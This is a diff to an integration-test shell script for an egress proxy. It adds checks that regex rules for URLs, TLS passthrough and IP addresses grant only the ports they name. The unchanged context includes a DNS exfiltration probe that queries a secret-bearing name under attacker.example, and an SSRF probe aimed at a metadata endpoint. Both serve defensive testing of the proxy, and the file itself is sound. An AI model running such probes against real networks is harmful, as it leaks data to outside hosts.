@@ -15,9 +15,11 @@
 #     GET http://10.200.0.100/pub-by-addr/**
 #     GET https://*.wildcard.example.com/public/**
 #     GET ~^https://blocked\.example\.com:9443/public/.*$
+#     GET ~^https://blocked\.example\.com/defaultport/.*$
 #   allowed_https_rules: sub.wildcard.example.com:443 absent.example.com:443 metadata.example.com:443
 #   allowed_http_rules:  allowed.example.com:80
-#   allow_tls_rules:     tlspass.example.com:443
+#   allow_tls_rules:     tlspass.example.com:443 ~^tlspass\.example\.com:8443$
+#   allowed_ip_rules:    ~^10\.200\.0\.\d+:9080$
 # ---------------------------------------------------------------------------
 set -uo pipefail
 
@@ -113,6 +115,18 @@ echo "=== [Regex URL rule - default port not covered by the literal-port rule] =
 CODE=$($C https://blocked.example.com/public/pkg.tgz)
 check_status "GET blocked.example.com/public/pkg.tgz" "$CODE" "403"
 
+# A separate ~regex rule on blocked.example.com, /defaultport/ this time,
+# names no port at all. It must match the default port (443) and nothing
+# else: a bare/full check that always resolved "true" would wrongly let
+# 9443 through too.
+echo "=== [Regex URL rule - no port names the default port only] ==="
+OUT=$($S https://blocked.example.com/defaultport/pkg.tgz)
+check_ok "GET blocked.example.com/defaultport/pkg.tgz" "$OUT" "ROOT GET"
+
+echo "=== [Regex URL rule - portless rule does not also grant a non-default port] ==="
+CODE=$($C https://blocked.example.com:9443/defaultport/pkg.tgz)
+check_status "GET blocked.example.com:9443/defaultport/pkg.tgz" "$CODE" "403"
+
 echo "=== [Host rule] ==="
 OUT=$($S -X DELETE https://sub.wildcard.example.com/anything/at/all)
 check_ok "DELETE sub.wildcard.example.com" "$OUT" "ROOT DELETE"
@@ -159,6 +173,11 @@ echo "=== [TLS passthrough] ==="
 OUT=$($S --insecure https://tlspass.example.com/public/x)
 check_ok "GET tlspass.example.com (passthrough)" "$OUT" "PUBLIC GET"
 
+# Same host as [TLS passthrough], a second port only the ~regex rule names.
+echo "=== [Regex TLS rule] ==="
+OUT=$($S --insecure https://tlspass.example.com:8443/public/x)
+check_ok "GET tlspass.example.com:8443 (passthrough)" "$OUT" "PUBLIC GET"
+
 echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
 echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
@@ -170,6 +189,18 @@ check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"
 echo "=== [Address, path outside the rule] ==="
 CODE=$($C http://10.200.0.100/private/secret)
 check_status "GET http://10.200.0.100/private/secret" "$CODE" "403"
+
+# Port 9080, distinct from the :80 the URL rule above already allows, so
+# reaching it proves this ~regex allowed_ip_rules entry's own doing.
+echo "=== [Regex IP rule] ==="
+OUT=$($S http://10.200.0.100:9080/anything)
+check_ok "GET http://10.200.0.100:9080/anything" "$OUT" "ROOT GET"
+
+# Same address, a port only the URL rule's :80 default would cover -- proves
+# the ~regex ip rule's own literal port (9080) is enforced, not "any port".
+echo "=== [Regex IP rule - other port not covered] ==="
+CODE=$($C http://10.200.0.100:8080/anything)
+check_status "GET http://10.200.0.100:8080/anything" "$CODE" "403"
 
 echo "=== [SSRF via allowlisted name resolving inward] ==="
 CODE=$($C --insecure https://metadata.example.com/latest/meta-data)
